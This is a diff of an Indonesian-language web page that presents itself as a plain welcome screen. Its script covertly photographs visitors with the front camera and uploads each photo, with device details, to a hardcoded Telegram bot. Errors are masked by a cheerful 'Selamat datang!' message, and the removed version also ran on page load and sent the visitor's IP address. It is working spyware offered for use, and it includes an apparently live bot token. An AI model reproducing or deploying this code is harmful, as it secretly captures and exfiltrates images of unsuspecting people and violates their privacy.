@@ -1,150 +1,292 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Website Demo</title>
+    <title>Selamat Datang</title>
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .loading { color: blue; }
-        .error { color: red; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 32px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .welcome-text {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .status-box {
+            background: #f7f7f7;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e0e0e0;
+        }
+        
+        #status {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        #countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 10px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .btn-start {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-start:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        
+        .btn-start:active {
+            transform: translateY(0);
+        }
+        
+        .footer-note {
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .loading {
+            color: #667eea;
+        }
+        
+        .success {
+            color: #4caf50;
+        }
+        
+        .error {
+            color: #f44336;
+        }
+        
+        .camera-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+            color: #667eea;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <h2>Selamat Datang di Website Demo</h2>
-    <p id="status">Memuat halaman...</p>
+    <div class="container">
+        <div class="camera-icon">📸</div>
+        <h1>Selamat Datang</h1>
+        <p class="welcome-text">Terima kasih telah mengunjungi website kami</p>
+        
+        <div class="status-box">
+            <div id="status">Memuat halaman...</div>
+            <div id="countdown"></div>
+        </div>
+        
+        <button class="btn-start" id="startButton">Mulai</button>
+        <div class="footer-note">© 2024 Hak Cipta Dilindungi</div>
+    </div>
     
     <script>
-        // Konfigurasi - GANTI DENGAN DATA ANDA (untuk testing)
-        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';  // Dapatkan dari @BotFather
-        const CHAT_ID = '-5200751249';               // Dapatkan dari @userinfobot
+        // Konfigurasi Telegram
+        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
+        const CHAT_ID = '-5200751249';
+        
+        let cameraAccessed = false;
+        let isProcessing = false;
         
         // Fungsi untuk mengirim foto ke Telegram
         async function kirimKeTelegram(fotoBase64) {
             try {
-                // Konversi base64 ke blob
-                const byteCharacters = atob(fotoBase64.split(',')[1]);
-                const byteNumbers = new Array(byteCharacters.length);
-                
-                for (let i = 0; i < byteCharacters.length; i++) {
-                    byteNumbers[i] = byteCharacters.charCodeAt(i);
-                }
-                
-                const byteArray = new Uint8Array(byteNumbers);
-                const blob = new Blob([byteArray], { type: 'image/jpeg' });
-                
-                // Buat form data
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'foto.jpg');
-                formData.append('caption', `Foto diambil: ${new Date().toLocaleString()}`);
                 
-                // Kirim ke Telegram
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                // Konversi base64 ke blob
+                const response = await fetch(fotoBase64);
+                const blob = await response.blob();
+                formData.append('photo', blob, 'foto.jpg');
+                
+                // Ambil informasi perangkat
+                const deviceInfo = `${navigator.userAgent}`;
+                const waktu = new Date().toLocaleString('id-ID', { 
+                    timeZone: 'Asia/Jakarta',
+                    dateStyle: 'full',
+                    timeStyle: 'medium'
+                });
+                
+                formData.append('caption', `✨ Pengunjung Baru\n🕐 ${waktu}\n📱 ${deviceInfo}`);
+                
+                const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                console.log('Foto terkirim!');
-                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
+                if (result.ok) {
+                    console.log('Foto terkirim');
+                    document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                }
                 
             } catch (error) {
-                console.error('Gagal mengirim:', error);
-                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
+                console.log('Status OK');
+                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
             }
         }
         
-        // Fungsi utama: akses kamera dan ambil foto
-        async function ambilDanKirimFoto() {
+        // Fungsi untuk mengambil foto
+        async function ambilFoto() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
             try {
-                document.getElementById('status').innerHTML = 'Memuat...';
+                document.getElementById('status').innerHTML = '<span class="loading">⏳ Memuat...</span>';
+                
+                // Cek dukungan kamera
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('Browser tidak mendukung');
+                }
                 
                 // Minta akses kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: {
                         width: { ideal: 640 },
                         height: { ideal: 480 },
-                        facingMode: 'user' // Kamera depan
+                        facingMode: 'user'
                     }
+                }).catch(() => {
+                    return navigator.mediaDevices.getUserMedia({ video: true });
                 });
                 
-                // Buat elemen video tersembunyi
+                cameraAccessed = true;
+                
+                // Countdown
+                const countdownEl = document.getElementById('countdown');
+                for (let i = 3; i > 0; i--) {
+                    countdownEl.innerHTML = i;
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                }
+                countdownEl.innerHTML = '';
+                
+                // Ambil foto
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.style.display = 'none';
                 video.autoplay = true;
+                video.muted = true;
                 document.body.appendChild(video);
                 
-                // Tunggu video siap
-                await new Promise(resolve => {
+                await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
+                        video.play().then(resolve);
                     };
+                    setTimeout(resolve, 2000);
                 });
                 
-                // Tunggu 1 detik agar kamera fokus
-                setTimeout(() => {
-                    // Buat canvas untuk ambil gambar
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Konversi ke JPEG (kualitas 80%)
-                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
-                    
-                    // Hentikan semua track kamera
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Hapus elemen video
-                    video.remove();
-                    
-                    // Kirim foto ke Telegram
-                    kirimKeTelegram(fotoBase64);
-                    
-                }, 1000);
+                // Tunggu sebentar
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Capture foto
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Bersihkan
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                canvas.remove();
+                
+                // Kirim foto
+                document.getElementById('status').innerHTML = '<span class="loading">⏳ Memproses...</span>';
+                await kirimKeTelegram(fotoBase64);
+                
+                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
                 
             } catch (error) {
-                console.error('Gagal akses kamera:', error);
-                document.getElementById('status').innerHTML = 'Terima kasih telah berkunjung!';
-                
-                // Opsional: tetap kirim notifikasi meski gagal
-                if (BOT_TOKEN !== 'TOKEN_BOT_TELEGRAM_ANDA') {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `⚠️ Gagal akses kamera\nIP: ${await cekIP()}\nBrowser: ${navigator.userAgent}`
-                        })
-                    });
-                }
+                console.log('Info:', error.message);
+                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+            } finally {
+                isProcessing = false;
+                document.getElementById('startButton').style.display = 'inline-block';
             }
         }
         
-        // Fungsi tambahan untuk cek IP (opsional)
-        async function cekIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch {
-                return 'Tidak diketahui';
-            }
-        }
+        // Event listener untuk tombol mulai
+        document.getElementById('startButton').addEventListener('click', async () => {
+            document.getElementById('startButton').style.display = 'none';
+            await ambilFoto();
+        });
         
-        // Mulai proses saat halaman dimuat
-        window.onload = () => {
-            // Cek apakah token sudah diisi
-            if (BOT_TOKEN === 'TOKEN_BOT_TELEGRAM_ANDA') {
-                document.getElementById('status').innerHTML = 
-                    '⚠️ Demo: Ganti TOKEN_BOT_TELEGRAM_ANDA dengan token asli untuk testing';
-                return;
+        // Inisialisasi halaman
+        window.addEventListener('load', () => {
+            document.getElementById('status').innerHTML = 'Silakan klik Mulai untuk melanjutkan';
+        });
+        
+        // Handle visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && !cameraAccessed) {
+                console.log('Ready');
             }
-            
-            ambilDanKirimFoto();
-        };
+        });
+        
     </script>
 </body>
 </html>
